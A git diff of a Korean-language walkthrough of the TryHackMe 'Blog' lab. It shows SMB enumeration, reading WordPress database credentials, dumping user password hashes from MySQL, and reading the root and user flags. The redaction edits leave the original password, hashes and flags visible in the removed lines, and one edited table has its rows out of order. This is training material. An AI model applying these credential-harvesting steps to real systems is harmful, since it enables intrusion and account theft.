@@ -1,8 +1,5 @@
 tryhackme/blog - medium
 
-스테가노그래피를 이용한 데이터 은폐 기술 중에 하나를 사용하는 것으로 확인이 되며,
-smbmap을 이용해 smb 디렉터리를 확인하고 smbget을 이용해 파일을 모두 받아온다.
-
 # Enumeration
 ```
 ┌──(kali㉿kali)-[~/tryhackme/blog]
@@ -120,6 +117,9 @@ smb: \> get check-this.png
 getting file \check-this.png of size 3082 as check-this.png (2.9 KiloBytes/sec) (average 236.5 KiloBytes/sec)
 
 ```
+스테가노그래피를 이용한 데이터 은폐 기술 중에 하나를 사용하는 것으로 확인이 되며,
+smbmap을 이용해 smb 디렉터리를 확인하고 smbclient로 침투해 파일을 모두 받아온다.
+
 
 # steghide
 ```
@@ -145,7 +145,6 @@ wrote extracted data to "rabbit_hole.txt".
 You've found yourself in a rabbit hole, friend.
 
 ```
-크크 rabbit hole에 빠졋다
 
 
 # Description
@@ -348,7 +347,7 @@ define('DB_NAME', 'blog');
 define('DB_USER', 'wordpressuser');
 
 /** MySQL database password */
-define('DB_PASSWORD', 'LittleYellowLamp90!@');
+define('DB_PASSWORD', '<wordpress_password>');
 
 /** MySQL hostname */
 define('DB_HOST', 'localhost');
@@ -368,7 +367,7 @@ define('FS_METHOD', 'direct');
 ```
 www-data@blog:/var/www/wordpress$ mysql -u wordpressuser -p
 mysql -u wordpressuser -p
-Enter password: LittleYellowLamp90!@
+Enter password: 
 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
 Your MySQL connection id is 27042
@@ -382,14 +381,19 @@ owners.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
-mysql> show databases;                                                                                                                              [14/1975]
-show databases;                                                                                                                                              +--------------------+         
-| Database           |                                                                                                                                       +--------------------+         
-| information_schema |                                                                                                                                       | blog               |         
-+--------------------+                                                                                                                                       2 rows in set (0.00 sec)  
+mysql> show databases; 
+show databases;
++--------------------+
++--------------------+
+| blog               |        
+| information_schema |                                                                                                                                           
+| Database           |                                                                                                                                         
++--------------------+
+ 2 rows in set (0.00 sec)  
 
 mysql> use blog;               
-use blog;                                                                                                                                                    Reading table information for completion of table and column names
+use blog;
+Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
@@ -422,46 +426,15 @@ select * from wp_users;
 | user_status | display_name  |
 +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------
 +-------------+---------------+
-|  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     
+|  1 | bjoel      | <before_hash> | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     
 |           0 | Billy Joel    |
-|  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     
+|  3 | kwheel     | <before_hash> | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     
 |           0 | Karen Wheeler |
 +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------
 +-------------+---------------+
 2 rows in set (0.00 sec)
 
 ```
-
-# bjoel 비밀번호 해시크래킹
-```
-┌──(kali㉿kali)-[~]
-└─$ hash-identifier                                                                                               
-   #########################################################################
-   #     __  __                     __           ______    _____           #
-   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
-   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
-   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
-   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
-   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
-   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
-   #                                                             By Zion3R #
-   #                                                    www.Blackploit.com #
-   #                                                   Root@Blackploit.com #
-   #########################################################################
---------------------------------------------------
- HASH: $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/
-
-Possible Hashs:
-[+] MD5(Wordpress)
---------------------------------------------------
-
-┌──(kali㉿kali)-[~]
-└─$ echo '$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/' > ./tryhackme/blog/bjoel.hash
-
-
-```
-나중에 다시 한다
-
 
 # linpeas.sh 를 이용한 후속 정보 수집
 ```
@@ -579,7 +552,7 @@ root.txt
 ```
 root@blog:/root# cat root.txt
 cat root.txt
-9a0b2b618bef9bfa7ac28c1353d9f318
+<flag>
 ```
 
 user.txt
@@ -590,7 +563,7 @@ find / -name "user.txt" 2> /dev/null
 /media/usb/user.txt
 root@blog:/root# cat /media/usb/user.txt
 cat /media/usb/user.txt
-c8421899aae571f7af486492b71a8ab7
+<flag>
 
 ```
 
